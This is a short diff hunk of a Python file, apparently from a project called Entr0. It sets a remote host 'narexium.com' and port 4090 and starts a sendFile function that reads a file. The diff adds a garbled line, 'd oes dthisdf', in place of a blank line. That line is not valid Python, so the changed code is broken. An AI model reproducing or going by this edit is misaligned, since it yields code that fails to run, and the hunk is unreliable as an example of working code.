@@ -17,7 +17,7 @@ RHOST = 'narexium.com'
 RPORT = 4090
 VERSION = '0.1 beta'
 PROJECTDIR = '/home/k4yt3x/Projects/Python/Entr0'
-
+d oes dthisdf 
 
 def sendFile(conn, filename, orgfname, last):
     with open(filename, 'r') as target:
